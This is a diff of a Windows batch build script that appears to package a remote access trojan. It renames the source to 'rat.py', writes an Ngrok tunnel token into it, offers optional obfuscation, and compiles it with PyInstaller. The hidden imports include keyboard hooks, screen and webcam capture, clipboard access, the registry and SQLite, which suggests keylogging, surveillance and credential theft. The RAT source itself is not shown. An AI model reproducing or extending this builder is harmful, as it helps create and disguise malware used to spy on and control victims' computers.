@@ -39,8 +39,8 @@ if /i "!USE_ICON!"=="y" (
 
 echo Creating modified file with Ngrok token...
 
-if not exist "oney.py" (
-    echo Cannot find oney.py in current folder. Place your source oney.py next to this builder.
+if not exist "rat.py" (
+    echo Cannot find rat.py in current folder. Place your source rat.py next to this builder.
     pause
     exit /b 1
 )
@@ -50,7 +50,7 @@ echo Creating modified Python file with Ngrok token...
 rem Crear archivo Python temporal para procesar el token
 echo import sys > temp_process.py
 echo. >> temp_process.py
-echo with open('oney.py', 'r', encoding='utf-8') as f: >> temp_process.py
+echo with open('rat.py', 'r', encoding='utf-8') as f: >> temp_process.py
 echo     content = f.read() >> temp_process.py
 echo. >> temp_process.py
 echo ngrok_token = sys.argv[1] >> temp_process.py
@@ -85,10 +85,10 @@ echo         new_lines.insert(2, '') >> temp_process.py
 echo. >> temp_process.py
 echo     new_content = '\n'.join(new_lines) >> temp_process.py
 echo. >> temp_process.py
-echo with open('modified_oney.py', 'w', encoding='utf-8') as f: >> temp_process.py
+echo with open('modified_rat.py', 'w', encoding='utf-8') as f: >> temp_process.py
 echo     f.write(new_content) >> temp_process.py
 echo. >> temp_process.py
-echo print('Successfully created modified_oney.py with Ngrok token') >> temp_process.py
+echo print('Successfully created modified_rat.py with Ngrok token') >> temp_process.py
 
 python temp_process.py "!NGROK_TOKEN!"
 
@@ -101,7 +101,7 @@ if errorlevel 1 (
 
 del temp_process.py
 
-set "AS_SOURCE=modified_oney"
+set "AS_SOURCE=modified_rat"
 set /p "USE_OBF=Do you want to obfuscate? (y/n): "
 if /i "!USE_OBF!"=="y" (
     if exist obf.py (
@@ -113,11 +113,11 @@ if /i "!USE_OBF!"=="y" (
             pause
             exit /b 1
         )
-        if exist obfuscated_oney.py (
-            set "AS_SOURCE=obfuscated_oney"
+        if exist obfuscated_rat.py (
+            set "AS_SOURCE=obfuscated_rat"
         ) else (
-            echo obfuscated_oney.py not present after obf.py; falling back to modified_oney.py
-            set "AS_SOURCE=modified_oney"
+            echo obfuscated_rat.py not present after obf.py; falling back to modified_rat.py
+            set "AS_SOURCE=modified_rat"
         )
     ) else (
         echo obf.py not found; skipping obfuscation.
@@ -160,7 +160,7 @@ if exist sqlite_path.tmp (
     echo Found _sqlite3 at: !SQLITE_PYD!
 )
 
-set "HIDDEN_ARGS=--hidden-import=pyautogui --hidden-import=pyperclip --hidden-import=keyboard --hidden-import=sqlite3 --hidden-import=_sqlite3 --hidden-import=io --hidden-import=socket --hidden-import=subprocess --hidden-import=os --hidden-import=time --hidden-import=webbrowser --hidden-import=threading --hidden-import=json --hidden-import=datetime --hidden-import=shutil --hidden-import=sys --hidden-import=glob --hidden-import=tempfile --hidden-import=pathlib --hidden-import=cv2 --hidden-import=numpy --hidden-import=PIL.Image --hidden-import=PIL.ImageGrab --hidden-import=urllib.request --hidden-import=zipfile --hidden-import=platform --hidden-import=flask --hidden-import=werkzeug --hidden-import=jinja2 --hidden-import=markupsafe --hidden-import=itsdangerous --hidden-import=click --hidden-import=requests --hidden-import=logging"
+set "HIDDEN_ARGS=--hidden-import=asyncio --hidden-import=base64 --hidden-import=ctypes --hidden-import=time --hidden-import=glob --hidden-import=io --hidden-import=json --hidden-import=logging --hidden-import=os --hidden-import=pathlib --hidden-import=platform --hidden-import=re --hidden-import=shutil --hidden-import=socket --hidden-import=sqlite3 --hidden-import=pygame --hidden-import=ssl --hidden-import=subprocess --hidden-import=sys --hidden-import=tempfile --hidden-import=threading --hidden-import=urllib.request --hidden-import=webbrowser --hidden-import=winreg --hidden-import=zipfile --hidden-import=datetime --hidden-import=urllib3 --hidden-import=aiohttp --hidden-import=certifi --hidden-import=cv2 --hidden-import=keyboard --hidden-import=numpy --hidden-import=pyautogui --hidden-import=pyperclip --hidden-import=requests --hidden-import=moviepy --hidden-import=cryptography --hidden-import=cryptography.hazmat.primitives.ciphers.aead --hidden-import=flask --hidden-import=PIL --hidden-import=werkzeug.serving --hidden-import=pycaw.pycaw --hidden-import=comtypes --hidden-import=pythoncom --hidden-import=win32api --hidden-import=win32con --hidden-import=win32gui"
 
 
 echo Building executable with PyInstaller...
@@ -212,8 +212,8 @@ endlocal
 exit /b 0
 
 :cleanup
-if exist modified_oney.py del modified_oney.py 2>nul
-if exist obfuscated_oney.py del obfuscated_oney.py 2>nul
+if exist modified_rat.py del modified_rat.py 2>nul
+if exist obfuscated_rat.py del obfuscated_rat.py 2>nul
 if exist sqlite_path.tmp del sqlite_path.tmp 2>nul
 if exist temp_process.py del temp_process.py 2>nul
 exit /b 0
